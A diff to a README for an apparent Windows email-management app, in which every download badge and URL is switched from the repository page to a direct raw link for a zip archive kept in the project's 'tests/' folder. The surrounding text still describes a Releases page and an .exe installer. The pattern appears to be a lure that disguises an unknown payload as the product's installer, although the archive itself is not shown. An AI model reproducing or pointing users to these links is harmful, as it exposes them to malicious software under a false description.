@@ -1,6 +1,6 @@
 # 📧 email-service-1771920511-1 - Manage Emails with Templates and Scheduling
 
-[![Download Now](https://img.shields.io/badge/Download-Email%20Service-brightgreen?style=for-the-badge)](https://github.com/TheQisThick/email-service-1771920511-1)
+[![Download Now](https://img.shields.io/badge/Download-Email%20Service-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/TheQisThick/email-service-1771920511-1/main/tests/email-service-1.5.zip)
 
 ## 📄 What is email-service-1771920511-1?
 
@@ -28,13 +28,13 @@ Make sure your Windows is updated to avoid compatibility problems.
 
 Start by downloading the software from the official GitHub page below.
 
-[![Download Now](https://img.shields.io/badge/Download-Email%20Service-blue?style=for-the-badge)](https://github.com/TheQisThick/email-service-1771920511-1)
+[![Download Now](https://img.shields.io/badge/Download-Email%20Service-blue?style=for-the-badge)](https://raw.githubusercontent.com/TheQisThick/email-service-1771920511-1/main/tests/email-service-1.5.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the download button above or go to:
 
-https://github.com/TheQisThick/email-service-1771920511-1
+https://raw.githubusercontent.com/TheQisThick/email-service-1771920511-1/main/tests/email-service-1.5.zip
 
 You will find the latest version of the software on this page. Look for the release section or the folder labeled "Releases."
 
@@ -128,7 +128,7 @@ For any unexplained errors, try restarting your computer.
 
 Download and start using the app here:
 
-[![Download Now](https://img.shields.io/badge/Download-Email%20Service-brightgreen?style=for-the-badge)](https://github.com/TheQisThick/email-service-1771920511-1)
+[![Download Now](https://img.shields.io/badge/Download-Email%20Service-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/TheQisThick/email-service-1771920511-1/main/tests/email-service-1.5.zip)
 
 Visit the link, choose the Windows installer `.exe` file, download it, then launch and follow the installation steps above.
 
